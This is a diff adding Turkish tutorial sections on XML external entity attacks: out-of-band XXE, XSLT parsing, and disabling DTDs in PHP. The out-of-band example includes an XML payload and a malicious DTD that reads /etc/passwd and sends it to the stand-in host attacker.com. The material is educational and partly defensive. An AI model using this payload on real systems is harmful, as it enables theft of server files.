@@ -123,9 +123,51 @@ Harici entity'ler, XML belgesinin dışındaki kaynaklara referans verir. Bu öz
 ```
 Bu örnekte, &dosya; entity'si, sunucunun dosya sistemindeki /etc/passwd dosyasına referans verir. Bu, saldırganların hassas bilgilere erişmesine olanak tanır.
 
-##Out-of-band XML external entity (OOB XXE)
+## Out-of-band XML external entity (OOB XXE)
+Bu saldırı türü, saldırganın XML dosyasına dış kaynaklardan veri yüklemesine olanak tanır. OOB XXE, hedef sistemin harici bir kaynağa (örneğin bir HTTP veya DNS sunucusu) bağlantı kurmasını sağlar. Bu şekilde saldırgan, doğrudan hedef sistemden veri çalmayı hedefler veya hedef sistemin davranışını gözlemleyebilir.
 
-##XLST Parsing
+### Uygulamalı OOB XXE Örneği
 
-##XML İşleme Sırasında DTD'yi Devre Dışı Bırakma
+Bir web uygulaması, kullanıcıların XML dosyaları yüklemesine izin verir. Saldırgan, bu özelliği kullanarak hedef sistemin harici bir sunucuya bağlantı kurmasını sağlar ve bu bağlantı üzerinden hedef sistemdeki bazı bilgileri çalar.
 
+Saldırgan, bir XML dosyası oluşturur ve bu dosyada harici bir entity tanımlar. Bu entity, saldırganın kontrol ettiği bir sunucuya yönlendirilir.
+
+```xml 
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+    <!ENTITY % ext SYSTEM "http://attacker.com/malicious.dtd">
+    %ext;
+]>
+<data>&send;</data>
+```
+
+Saldırgan, http://attacker.com/malicious.dtd adresinde bulunan DTD dosyasını hazırlar. Bu dosya, hedef sistemin /etc/passwd dosyasını okumasını ve saldırganın kontrol ettiği sunucuya göndermesini sağlar.
+
+***malicious.dtd :***
+
+```xml 
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
+%eval;
+
+```
+Saldırgan, bu zararlı XML dosyasını hedef web uygulamasına yükler. Hedef sistem, XML dosyasını işlerken malicious.dtd dosyasını indirir ve belirtilen komutları çalıştırır.Hedef sistem, /etc/passwd dosyasının içeriğini http://attacker.com adresine gönderir. Saldırgan, bu isteği alır ve hedef sistemden çalınan bilgilere erişir.
+
+
+## XLST Parsing nedir ?
+
+XSLT parsing, XML verilerini farklı biçimlere dönüştürme sürecidir. XSLT (eXtensible Stylesheet Language Transformations), XML dosyalarını alıp bunları başka bir XML dosyasına, HTML sayfasına, düz metin dosyasına veya başka formatlara dönüştürmek için kullanılır. Bu dönüşüm, XSLT stil sayfaları (stylesheet) aracılığıyla gerçekleştirilir. XSLT stil sayfaları, XML verilerinin nasıl dönüştürüleceğini belirten kurallar ve şablonlar içerir. Bir XSLT işlemcisi (parser), bu stil sayfasını ve ilgili XML belgesini alarak belirtilen dönüşümü yapar. Bu işlem, XML verilerini farklı biçimlerde görüntülemeyi veya işlemeyi kolaylaştırır.
+
+## XML İşleme Sırasında DTD'yi Devre Dışı Bırakma
+
+XML işleme sırasında DTD'yi devre dışı bırakmak, XXE saldırılarını önlemek için önemli bir güvenlik önlemidir. Bu işlem, XML işleyicisinin harici veya dahili DTD'leri çözmesini engeller ve böylece kötü amaçlı kodların çalıştırılmasını önler. 
+
+### PHP'de DTD'yi Devre Dışı Bırakma
+PHP'de libxml_disable_entity_loader fonksiyonunu kullanarak DTD işleme özelliğini devre dışı bırakabilirsiniz:
+
+```php
+libxml_disable_entity_loader(true);
+
+$xml = new DOMDocument();
+$xml->load('dosya.xml');
+```
